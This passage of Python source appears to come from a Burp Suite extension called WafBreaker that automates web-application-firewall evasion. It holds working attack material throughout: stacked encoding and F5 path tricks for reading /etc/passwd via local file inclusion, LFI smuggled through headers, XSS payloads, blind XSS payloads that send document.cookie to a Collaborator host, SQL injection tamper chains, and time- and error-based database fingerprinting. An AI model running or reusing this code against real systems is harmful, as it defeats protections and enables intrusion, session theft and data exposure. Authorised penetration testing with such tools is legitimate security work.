            return

        self._log("[2-M-3] Stacked double-transform probes...")
        _stack_pairs = [
            ("encoded-dotslash-full",    "overlong-utf8-c0af"),
            ("double-urlencode",         "semicolon-sep"),
            ("path-params",              "double-urlencode"),
            ("extra-slash",              "unicode-u002f"),
            ("double-urlencode",         "uppercase"),
            ("encoded-dotslash-dotonly", "overlong-utf8-e080af"),
            ("semicolon-sep",            "encoded-dotslash-full"),
            ("valid-prefix",             "double-urlencode"),
        ]
        for (t1, t2) in _stack_pairs:
            if self._bypass:
                break
            if t1 not in _tamper_dict or t2 not in _tamper_dict:
                continue
            try:
                f1, d1 = _tamper_dict[t1]
                f2, d2 = _tamper_dict[t2]
                stacked = f2(f1(probe))
                if stacked == probe or stacked == f1(probe) or stacked == f2(probe):
                    continue
                req = self._build_request(stacked)
                status, body = self._send(req)
                oc = self._outcome(status, body)
                stack_label = "stack:%s+%s" % (t1, t2)
                self._report("[Bypass] LFI " + stack_label, stacked, status, body, oc)
                if not self._is_blocked(status, body):
                    _f1, _f2 = f1, f2
                    stacked_func = lambda p, __f1=_f1, __f2=_f2: __f2(__f1(p))
                    _report_and_set(stack_label, "lfi_encoding", stacked_func, [],
                                    stacked, d1 + " then " + d2)
                    return
            except Exception:
                continue

        if self._bypass:
            return

        self._log("[2-M-4] F5 ASM path-normalisation tricks...")
        try:
            _double_slash   = probe.replace("/", "//")
            _semi_sep       = probe.replace("../", "..;/")
            _semi_css       = probe.replace("../", "..;x=1.css/")
            _semi_jpg       = probe.replace("../", "..;x=1.jpg/")
            _dot_prefix     = probe.replace("../", "./../")
            _upper_tgt      = probe.replace("etc/passwd", "ETC/PASSWD")
            _mixed_tgt      = probe.replace("etc/passwd", "Etc/Passwd")
            _long_pfx       = "/static/images/../../../../../../../../" + probe.lstrip("./")
            _abs_trv        = "/../../.." + probe.lstrip(".")
        except Exception:
            _double_slash = _semi_sep = _semi_css = _semi_jpg = probe
            _dot_prefix = _upper_tgt = _mixed_tgt = _long_pfx = _abs_trv = probe

        f5_tricks = [
            (_double_slash,   "f5-double-slash"),
            (_semi_sep,       "f5-semi-sep"),
            (_semi_css,       "f5-semi-ext-css"),
            (_semi_jpg,       "f5-semi-ext-jpg"),
            (_dot_prefix,     "f5-dot-prefix"),
            (_upper_tgt,      "f5-upper-target"),
            (_mixed_tgt,      "f5-mixed-target"),
            (_long_pfx,       "f5-long-prefix"),
            (_abs_trv,        "f5-abs-traversal"),
        ]
        for (f5_payload, f5_label) in f5_tricks:
            if self._bypass:
                break
            if f5_payload == probe:
                continue
            req = self._build_request(f5_payload)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] LFI %s" % f5_label, f5_payload, status, body, oc)
            if not self._is_blocked(status, body):
                _fp_copy   = f5_payload
                _orig_copy = probe
                f5_func = lambda p, _fp=_fp_copy, _op=_orig_copy: (
                    p.replace(_op, _fp) if _op in p else _fp
                )
                _report_and_set(f5_label, "lfi_encoding", f5_func, [],
                                f5_payload, "F5-specific path trick")
                return

        if self._bypass:
            return

        self._log("[2-M-5] Side-channel LFI header injection...")
        _sc_variants = [
            ("Referer: https://example.com/" + probe,           "lfi-referer"),
            ("X-Include: " + probe,                             "lfi-x-include"),
            ("X-File-Path: " + probe,                           "lfi-x-file-path"),
            ("X-Original-URL: " + probe,                        "lfi-x-orig-url"),
            ("X-Rewrite-URL: " + probe,                         "lfi-x-rewrite-url"),
        ]
        for (_hdr, _hlabel) in _sc_variants:
            if self._bypass:
                break
            req = self._build_request(probe, extra_headers=[_hdr])
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] LFI %s" % _hlabel, probe, status, body, oc)
            if not self._is_blocked(status, body):
                _hdr_copy  = _hdr
                _prob_copy = probe
                hdr_func = lambda p, _hb=_hdr_copy, _op=_prob_copy: (
                    _hb.replace(_op, p) if _op in _hb else _hb
                )
                self._log("[+] LFI side-channel bypass WORKED: %s" % _hlabel)
                self._bypass = {
                    "type":    "lfi_header_inject",
                    "func":    hdr_func,
                    "name":    _hlabel,
                    "headers": [],
                }
                self._add_issue(
                    "LFI WAF Bypass Found -- %s" % _hlabel,
                    "The LFI payload was not blocked when injected via the <b>%s</b> header "
                    "instead of the normal parameter.<br><br>"
                    "Test payload: <code>%s</code><br>"
                    "This indicates the WAF inspects parameter values but ignores header "
                    "content for path-traversal patterns." % (_hlabel, probe[:200]),
                    severity="Medium",
                    confidence="Firm",
                )
                return

        self._log("[2-M complete]  No LFI encoding bypass found.")

    def _apply_bypass(self, payload, kwargs):
        if not self._bypass:
            return payload, kwargs
        btype = self._bypass["type"]
        if btype == "header":
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "charset_ibm037":
            payload = ibm037_encode(payload)
            kwargs["charset"] = "ibm037"
        elif btype == "charset":
            kwargs["charset"] = self._bypass["cs"]
        elif btype == "method":
            kwargs["override_method"] = self._bypass["verb"]
        elif btype == "junk":
            kwargs["add_junk"] = True
        elif btype in ("override_header", "ct"):
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "tamper":
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
        elif btype == "lfi_encoding":
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
        elif btype == "lfi_encoding_xff":
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
            kwargs["extra_headers"] = self._bypass.get("headers", [])
        elif btype == "lfi_encoding_combo":
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
            kwargs["extra_headers"] = self._bypass.get("headers", [])
        elif btype == "lfi_header_inject":
            try:
                hdr = self._bypass["func"](payload)
                kwargs["extra_headers"] = [hdr] if isinstance(hdr, str) else hdr
            except Exception:
                pass
        elif btype == "whitespace":
            payload = payload.replace(' ', self._bypass["char"])
        elif btype == "gzip_body":
            kwargs["compress_body"] = True
        elif btype == "json_body":
            kwargs["json_body"]   = True
            kwargs["json_escape"] = self._bypass.get("escape", False)
        elif btype == "cookie":
            kwargs["extra_headers"] = [
                "Cookie: waf_test=" + payload.replace(' ', '+')
            ]
        elif btype == "hpp":
            _param = self._bypass.get("param", "waf")
            payload = "safe_value&%s=%s" % (_param, payload.lstrip("'\" "))
        elif btype == "smuggling":
            kwargs["extra_headers"] = self._bypass.get("headers", [])
        elif btype == "json_inline":
            payload = tamper_json_inline(payload)
        return payload, kwargs

    def _detect_xss_context(self, probe_marker="ENIMARKER7x7"):
        try:
            req = self._build_request(probe_marker)
            s, b = self._send(req)
            if probe_marker not in b:
                return "unknown"
            idx = b.find(probe_marker)
            before = b[max(0, idx-100):idx]
            after  = b[idx+len(probe_marker):idx+len(probe_marker)+80]
            if re.search(r"<script[^>]*>.*$", before, re.IGNORECASE | re.DOTALL):
                if re.search(r"""['"][^'"]*$""", before):
                    return "js_string"
                return "js_block"
            if re.search(r"""[a-zA-Z_-]+=(['"])[^'"]*$""", before):
                return "html_attr"
            if re.search(r"""(href|src|action|data)=['"']?[^'"]*$""", before, re.IGNORECASE):
                return "url"
            return "html_body"
        except Exception:
            return "unknown"

    _XSS_CONTEXT_PAYLOADS = {
        "html_body":  [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ],
        "html_attr":  [
            "\" onmouseover=\"alert(1)\"",
            "' onmouseover='alert(1)'",
            "\" autofocus onfocus=\"alert(1)\"",
        ],
        "js_string":  [
            "';alert(1)//",
            "\";alert(1)//",
            "\\';alert(1)//",
        ],
        "js_block":   [
            "alert(1)",
            "</script><script>alert(1)</script>",
        ],
        "url":        [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
    }

    def _phase_payloads(self):
        payloads  = PAYLOADS[self._vtype]
        self._log("[Phase 3]  %d payloads queued..." % len(payloads))
        sqli_confirmed = False

        if self._vtype == "XSS":
            ctx = self._detect_xss_context()
            self._log("[Phase 3]  XSS reflection context: %s" % ctx)
            ctx_payloads = self._XSS_CONTEXT_PAYLOADS.get(ctx, [])
            if ctx_payloads:
                payloads = ctx_payloads + [p for p in payloads if p not in ctx_payloads]
                self._log("[Phase 3]  Re-prioritised %d context-specific payloads first" % len(ctx_payloads))

        for idx, payload in enumerate(payloads, 1):
            self._log("[%d/%d] %s" % (idx, len(payloads), payload[:70]))

            kwargs  = {}
            p, kw   = self._apply_bypass(payload, kwargs)
            req     = self._build_request(p, **kw)
            status, body = self._send(req)
            oc      = self._outcome(status, body)
            self._report("Payload #%d" % idx,
                                 payload, status, body, oc)

            if oc == "VULN!":
                bypass_desc = (
                    self._bypass.get("name", self._bypass["type"])
                    if self._bypass else "direct (no WAF / WAF not blocking)"
                )
                if self._vtype == "SQL Injection":
                    self._sqli_confirm_and_poc(
                        break_payload  = payload,
                        break_label    = "payload sweep",
                        repair_payload = payload,
                        repair_label   = "direct VULN pattern",
                        db_variant     = None,
                        bool_confirmed = False,
                        source         = "Payload Sweep (Phase 3)",
                        extra_payload  = payload,
                        bypass_desc    = bypass_desc,
                    )
                elif self._vtype not in self._issued_high:
                    self._issued_high.add(self._vtype)
                    self._add_issue(
                        "%s Vulnerability Confirmed via WAF Bypass" % self._vtype,
                        "WafBreaker confirmed a <b>%s</b> vulnerability.<br><br>"
                        "The payload was reflected or executed in the server response, "
                        "indicating the backend processed the injected data.<br><br>"
                        "Payload: <code>%s</code><br>"
                        "Bypass technique applied: <b>%s</b><br>"
                        "Response status: <b>%d</b>"
                        % (self._vtype, payload[:500], bypass_desc, status),
                        severity="High",
                        confidence="Certain",
                    )
                else:
                    ev = self._vuln_extra_payloads.setdefault(self._vtype, [])
                    ev.append(payload)
                    self._log("[+] Additional %s payload confirmed (no new issue): %s"
                              % (self._vtype, payload[:80]))

            if oc == "BLOCKED":
                mutations = _get_systematic_mutations(self._vtype, p)
                if mutations:
                    self._log("[MUT] Base blocked -- escalating through %d systematic mutations..."
                              % len(mutations))
                for mutated_p, tier_label in mutations:
                    kwargs_m  = {}
                    mp, mkw   = self._apply_bypass(mutated_p, kwargs_m)
                    req_m     = self._build_request(mp, **mkw)
                    s_m, b_m  = self._send(req_m)
                    oc_m      = self._outcome(s_m, b_m)
                    self._report("[MUT/%s]" % tier_label, mutated_p, s_m, b_m, oc_m)

                    if oc_m == "VULN!":
                        self._log("[+] Mutation confirmed VULN: %s -> %s"
                                  % (tier_label, mutated_p[:60]))
                        bypass_desc = (
                            self._bypass.get("name", self._bypass["type"])
                            if self._bypass else "mutation-only"
                        ) + " + mutation(%s)" % tier_label
                        if self._vtype == "SQL Injection":
                            self._sqli_confirm_and_poc(
                                break_payload  = mutated_p,
                                break_label    = "systematic mutation (%s)" % tier_label,
                                repair_payload = mutated_p,
                                repair_label   = "mutation VULN",
                                db_variant     = None,
                                bool_confirmed = False,
                                source         = "Phase 3 Mutation (%s)" % tier_label,
                                extra_payload  = mutated_p,
                                bypass_desc    = bypass_desc,
                            )
                        elif self._vtype not in self._issued_high:
                            self._issued_high.add(self._vtype)
                            self._add_issue(
                                "%s via Systematic Mutation Bypass" % self._vtype,
                                "WafBreaker found a <b>%s</b> vulnerability using the "
                                "systematic mutation engine.<br><br>"
                                "Base payload <code>%s</code> was blocked (WAF rule matched).<br>"
                                "Mutation <b>%s</b> bypassed the rule:<br>"
                                "<code>%s</code><br><br>"
                                "This confirms the WAF rule is bypassable via this "
                                "semantic/syntactic variant."
                                % (self._vtype, payload[:200], tier_label, mutated_p[:300]),
                                severity="High",
                                confidence="Certain",
                            )
                        break
                    elif oc_m != "BLOCKED":
                        self._log("[~] Mutation passed WAF (no pattern hit): %s" % tier_label)

            if (self._vtype == "SQL Injection"
                    and not sqli_confirmed
                    and oc in ("PASSED", "BYPASS", "VULN!")):
                if any(tok in payload.upper() for tok in
                       ("/**/", "UNION", "AND 1=1", "OR 1=1",
                        "SLEEP", "WAITFOR", "PG_SLEEP", "AND 1",
                        "/*!",   "--", "#")):
                    sqli_confirmed = True
                    self._log("[*] Bypass confirmed on payload #%d -- firing DB fingerprint battery..." % idx)
                    self._phase_sqli_fingerprint()

            time.sleep(0.08)

        self._log("[Phase 3 complete]")

        if (self._vtype == "SQL Injection"
                and not sqli_confirmed
                and not self._bypass):
            self._phase_tamper_combo()

    def _phase_tamper_combo(self):
        self._log("[Phase 3.8] Tamper combos (2- and 3-tamper chains)...")

        canaries = [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1 AND SLEEP(0)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        ]

        any_tampers   = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "any"][:10]
        mysql_tampers = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "mysql"][:10]
        pool = any_tampers + mysql_tampers

        for canary in canaries:
            if self._bypass:
                break
            for i, (n1, f1, _d1) in enumerate(pool):
                if self._bypass:
                    break
                for n2, f2, _d2 in pool[i+1:i+4]:
                    try:
                        chained2 = f2(f1(canary))
                    except Exception:
                        continue
                    if chained2 == canary:
                        continue
                    req2 = self._build_request(chained2)
                    status2, body2 = self._send(req2)
                    oc2 = self._outcome(status2, body2)
                    self._report("[Bypass] Combo: %s+%s" % (n1, n2),
                                 chained2, status2, body2, oc2)

                    if not self._is_blocked(status2, body2):
                        extended = False
                        for n3, f3, _d3 in pool[:4]:
                            if n3 in (n1, n2):
                                continue
                            try:
                                chained3 = f3(chained2)
                            except Exception:
                                continue
                            if chained3 == chained2:
                                continue
                            req3 = self._build_request(chained3)
                            status3, body3 = self._send(req3)
                            oc3 = self._outcome(status3, body3)
                            self._report("[Bypass] 3-Chain: %s+%s+%s" % (n1, n2, n3),
                                         chained3, status3, body3, oc3)
                            if not self._is_blocked(status3, body3):
                                self._log("[+] 3-Tamper chain WORKED: %s+%s+%s"
                                          % (n1, n2, n3))
                                f1r, f2r, f3r = f1, f2, f3
                                def _triple(p, _a=f1r, _b=f2r, _c=f3r):
                                    return _c(_b(_a(p)))
                                chain_name = "%s+%s+%s" % (n1, n2, n3)
                                self._bypass = {
                                    "type": "tamper",
                                    "func": _triple,
                                    "name": chain_name,
                                }
                                conf3 = self._bypass_confidence(status3, body3)
                                self._add_issue(
                                    "WAF Bypass via 3-Tamper Chain -- %s" % chain_name,
                                    "WafBreaker found a <b>three-tamper chain</b> that "
                                    "bypasses the WAF for <b>SQL Injection</b>.<br><br>"
                                    "Chain: <b>%s</b> -> <b>%s</b> -> <b>%s</b><br>"
                                    "Canary payload: <code>%s</code><br>"
                                    "Result after chain: <code>%s</code>"
                                    % (n1, n2, n3, canary[:200], chained3[:300]),
                                    severity="Medium",
                                    confidence=conf3,
                                )
                                extended = True
                                break

                        if not extended:
                            self._log("[+] 2-Tamper combo WORKED: %s+%s" % (n1, n2))
                            f1r, f2r = f1, f2
                            def _combo(p, _a=f1r, _b=f2r):
                                return _b(_a(p))
                            chain_name2 = "%s+%s" % (n1, n2)
                            self._bypass = {
                                "type": "tamper",
                                "func": _combo,
                                "name": chain_name2,
                            }
                            conf2 = self._bypass_confidence(status2, body2)
                            self._add_issue(
                                "WAF Bypass via Tamper Chain -- %s" % chain_name2,
                                "WafBreaker found a two-tamper chain that bypasses the WAF "
                                "for <b>SQL Injection</b> payloads.<br><br>"
                                "Chain: <b>%s</b> -> <b>%s</b><br>"
                                "Test payload: <code>%s</code><br>"
                                "Result payload after chain: <code>%s</code><br>"
                                "The transformed payload was not blocked, indicating the WAF "
                                "cannot detect this obfuscation combination."
                                % (n1, n2, canary[:200], chained2[:300]),
                                severity="Medium",
                                confidence=conf2,
                            )
                        return

        self._log("[Phase 3.8 complete]")

    def _phase_header_injection(self):
        self._log("[3.2] Header injection -- testing headers as injection surface...")

        probe = INITIAL_PROBES.get(self._vtype, "")
        if not probe:
            return

        _target_headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "CF-Connecting-IP",
            "X-Client-IP",
            "True-Client-IP",
            "X-Custom-IP-Authorization",
            "X-Originating-IP",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Path",
            "Via",
            "Forwarded",
            "X-Forwarded-Host",
            "X-Host",
            "X-Forwarded-Server",
            "User-Agent",
            "Referer",
            "Origin",
        ]

        found_in_header = []

        for hdr in _target_headers:
            try:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                extra_hdrs = pkw.get("extra_headers", [])
                hdr_injection = ["%s: %s" % (hdr, pp)] + extra_hdrs
                req = self._build_request(
                    "1",
                    extra_headers=hdr_injection,
                )
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[HdrInject] %s" % hdr, probe, s, b, oc)

                if oc == "VULN!":
                    found_in_header.append(hdr)
                    self._log("[+] Header injection confirmed in: %s" % hdr)
            except Exception:
                pass

        if found_in_header:
            self._add_issue(
                "Header Injection -- %s via Uninspected Headers" % self._vtype,
                "The WAF did not inspect HTTP header values. The probe "
                "<code>%s</code> triggered a vulnerable response when injected "
                "into the following headers:<br><br><b>%s</b><br><br>"
                "Many WAFs only inspect URL parameters and POST body, leaving "
                "these headers as a reliable bypass surface. Critical for SQLi, "
                "XSS, CMDi, and SSRF where the backend trusts forwarded values "
                "(e.g., logging User-Agent to DB, trusting X-Forwarded-For as "
                "IP source for auth bypass)."
                % (probe, ", ".join(found_in_header)),
                severity="High",
                confidence="Certain",
            )

    def _phase_blind_xss(self):
        self._log("[3.5] Blind XSS -- sending OOB payloads...")

        collab_host = getattr(self, "_collab_host", None) or "YOUR.BURP.COLLABORATOR.HOST"

        _blind_payloads = [
            "<script src=//%s/bxss></script>" % collab_host,
            "<script>new Image().src='//%s/bxss?c='+document.cookie</script>" % collab_host,
            "<img src=//%s/bxss.gif>" % collab_host,
            "<img src=x onerror=\"new Image().src='//%s/bxss'\">",
            "<svg/onload=\"new Image().src='//%s/bxss'\">",
            "<style>@import//%s/bxss.css</style>" % collab_host,
            "<input autofocus onfocus=\"new Image().src='//%s/bxss'\">",
            "<iframe src=//%s/bxss></iframe>" % collab_host,
            "<script>fetch('//%s/bxss?u='+location.href)</script>" % collab_host,
            "<img src=x onerror=\"var s=document.createElement('script');s.src='//%s/bxss';document.head.appendChild(s)\">" % collab_host,
            "javascript:/*--></title></style></textarea></script></xmp>"
            "<svg/onload='new Image().src=\"//%s/bxss?c=\"+document.cookie'//>" % collab_host,
        ]

        sent_payloads = []
        for bp in _blind_payloads:
            kw = {}
            pp, pkw = self._apply_bypass(bp, kw)
            req = self._build_request(pp, **pkw)
            s, b = self._send(req)
            oc = self._outcome(s, b)
            self._report("[BlindXSS]", bp, s, b, oc)
            sent_payloads.append(bp)

        collab_client = getattr(self, "_collab_client", None)
        interactions = []
        if collab_client:
            import time as _time
            self._log("[3.5] Polling Collaborator for up to 15 s...")
            deadline = _time.time() + 15
            while _time.time() < deadline:
                try:
                    hits = collab_client.fetchAllCollaboratorInteractions()
                    if hits:
                        for hit in hits:
                            interactions.append(
                                "%s from %s at %s" % (
                                    hit.getType(),
                                    hit.getClientIpAddress(),
                                    hit.getTimeStamp(),
                                )
                            )
                        break
                except Exception:
                    pass
                _time.sleep(3)

        if interactions:
            detail = (
                "Blind XSS confirmed via Burp Collaborator OOB interaction.<br><br>"
                "<b>Interactions received:</b><br>"
                + "<br>".join(interactions)
                + "<br><br>"
                "<b>Payloads sent:</b><br>"
                + "<br>".join("<code>%s</code>" % p for p in sent_payloads)
            )
            self._add_issue(
                "Blind XSS -- Confirmed via Collaborator",
                detail,
                severity="High",
                confidence="Certain",
            )
            self._log("[3.5] BLIND XSS CONFIRMED -- %d interactions" % len(interactions))
        else:
            detail = (
                "Blind XSS payloads were injected into the parameter. "
                "No Burp Collaborator callback was received within the poll window, "
                "but the payload may fire later (e.g., when an admin views a stored entry).<br><br>"
                "<b>Collaborator host used:</b> <code>%s</code><br><br>"
                "<b>Payloads sent:</b><br>" % collab_host
                + "<br>".join("<code>%s</code>" % p for p in sent_payloads[:6])
            )
            self._add_issue(
                "Blind XSS -- Payloads Injected (awaiting callback)",
                detail,
                severity="Medium",
                confidence="Tentative",
            )
            self._log("[3.5] Blind XSS payloads sent -- no callback yet. Check Collaborator.")

    def _phase_tamper_sweep(self):
        if self._vtype != "SQL Injection":
            return

        seeds_per_cat  = 4
        total_estimate = len(SQLI_TAMPERS) * len(SQLI_PAYLOAD_SEEDS) * seeds_per_cat
        self._log("[Phase 4] Tamper sweep: %d tampers x %d categories x ~%d seeds ~ %d requests..." % (
            len(SQLI_TAMPERS), len(SQLI_PAYLOAD_SEEDS), seeds_per_cat, total_estimate))

        sqli_confirmed = False
        done = 0

        for (cat_label, seed_payloads) in SQLI_PAYLOAD_SEEDS:
            seed = seed_payloads[0]

            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                done += 1
                try:
                    tampered = tfunc(seed)
                except Exception:
                    continue
                if tampered == seed:
                    continue

                kwargs = {}
                if self._bypass and self._bypass.get("type") != "tamper":
                    _, kwargs = self._apply_bypass(tampered, kwargs)

                req = self._build_request(tampered, **kwargs)
                status, body = self._send(req)
                oc = self._outcome(status, body)

                label = "[P4] %s | %s" % (cat_label, tname)
                self._report(label, tampered, status, body, oc)

                if oc == "VULN!":
                    self._sqli_confirm_and_poc(
                        break_payload  = tampered,
                        break_label    = "tamper: " + tname,
                        repair_payload = tampered,
                        repair_label   = "direct VULN pattern via %s" % tname,
                        db_variant     = None,
                        bool_confirmed = False,
                        source         = "Tamper Sweep (Phase 4) -- %s" % tname,
                        extra_payload  = tampered,
                        bypass_desc    = tname,
                    )

                if not sqli_confirmed and oc in ("PASSED", "BYPASS", "VULN!"):
                    sqli_confirmed = True
                    self._log("[*] Phase 4 bypass confirmed: %s + %s -- firing DB fingerprint..." % (
                        cat_label, tname))
                    self._phase_sqli_fingerprint()

                for extra_seed in _spread_sample(seed_payloads, 4)[1:]:
                    try:
                        tampered2 = tfunc(extra_seed)
                    except Exception:
                        continue
                    if tampered2 == extra_seed:
                        continue
                    req2 = self._build_request(tampered2, **kwargs)
                    st2, body2 = self._send(req2)
                    oc2 = self._outcome(st2, body2)
                    self._report("[P4b] %s | %s" % (cat_label, tname),
                                 tampered2, st2, body2, oc2)
                    if oc2 == "VULN!":
                        self._add_issue(
                            "SQL Injection Confirmed via Tamper -- %s" % tname,
                            "WafBreaker confirmed <b>SQL Injection</b> using tamper "
                            "<b>%s</b> on spread-sampled seed from <b>%s</b>.<br><br>"
                            "Tampered payload: <code>%s</code><br>"
                            "Response status: <b>%d</b>"
                            % (tname, cat_label, tampered2[:400], st2),
                            severity="High",
                            confidence="Certain",
                        )

        self._log("[Phase 4 complete] -- %d variants sent." % done)

    def _phase_sqli_fingerprint(self):
        self._log("[Phase 3.5] DB Fingerprint: sending true/false pairs...")

        fingerprints = [
            ("MySQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MySQL  SLEEP",  "1 AND SLEEP(0)--", "1 AND SLEEP(5)--"),
            ("MySQL  VER  ",
             "1 AND SUBSTRING(@@version,1,1)>'3'--",
             "1 AND SUBSTRING(@@version,1,1)>'9'--"),
            ("MySQL  EXTV ",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,'no'))--"),
            ("MSSQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MSSQL  WAIT ",  "1; WAITFOR DELAY '0:0:0'--",
                              "1; WAITFOR DELAY '0:0:5'--"),
            ("MSSQL  VER  ",
             "1 AND SUBSTRING(@@version,1,9)='Microsoft'--",
             "1 AND SUBSTRING(@@version,1,9)='ZZZZZZ'--"),
            ("PgSQL  TRUE ",
             "1 AND 1=(SELECT 1)--",
             "1 AND 1=(SELECT 2)--"),
            ("PgSQL  SLEEP",
             "1 AND (SELECT 1 FROM PG_SLEEP(0))=1--",
             "1 AND (SELECT 1 FROM PG_SLEEP(5))=1--"),
            ("PgSQL  VER  ",
             "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
             "' AND 1=CAST('no' AS NUMERIC)--"),
            ("Oracle TRUE ",
             "1 AND 1=1 FROM DUAL--",
             "1 AND 1=2 FROM DUAL--"),
            ("Oracle PIPE ",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',0)=1--",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--"),
            ("SQLite TRUE ",
             "1 AND 1=1--",
             "1 AND 1=2--"),
            ("SQLite VER  ",
             "1 AND SQLITE_VERSION()>'3'--",
             "1 AND SQLITE_VERSION()>'9'--"),
        ]

        for label, true_pl, false_pl in fingerprints:
            kwargs_t = {}
            t_pl, kw_t = self._apply_bypass(true_pl,  kwargs_t)
            req_t  = self._build_request(t_pl, **kw_t)
            st_t, body_t = self._send(req_t)

            kwargs_f = {}
            f_pl, kw_f = self._apply_bypass(false_pl, kwargs_f)
            req_f  = self._build_request(f_pl, **kw_f)
            st_f, body_f = self._send(req_f)

            len_t = len(body_t)
            len_f = len(body_f)
            diff  = abs(len_t - len_f)
            if diff > 20 or st_t != st_f:
                diff_label = "DIFF=%d" % diff
                oc_t = "VULN!"
                oc_f = "VULN!"
                self._log("[!!!] %s -- response differential %d bytes (T:%d F:%d)" % (
                    label.strip(), diff, st_t, st_f))
                self._add_issue(
                    "Blind SQL Injection Confirmed -- %s" % label.strip(),
                    "WafBreaker detected a <b>response differential</b> confirming "
                    "blind SQL injection via the <b>%s</b> fingerprint pair.<br><br>"
                    "TRUE condition payload:&nbsp;&nbsp;<code>%s</code><br>"
                    "Response: <b>%d bytes</b> (HTTP %d)<br><br>"
                    "FALSE condition payload: <code>%s</code><br>"
                    "Response: <b>%d bytes</b> (HTTP %d)<br><br>"
                    "Differential: <b>%d bytes</b> -- the backend responded differently "
                    "to the boolean condition, confirming blind injection."
                    % (label.strip(),
                       true_pl[:300], len_t, st_t,
                       false_pl[:300], len_f, st_f,
                       diff),
                    severity="High",
                    confidence="Certain",
                )
            else:
                diff_label = "SAME"
                oc_t = self._outcome(st_t, body_t)
                oc_f = self._outcome(st_f, body_f)

            self._report(
                label + " [TRUE]  " + diff_label,
                true_pl, st_t, body_t, oc_t)
            self._report(
                label + " [FALSE] " + diff_label,
                false_pl, st_f, body_f, oc_f)

            time.sleep(0.08)

        self._log("[Phase 3.5 complete]")
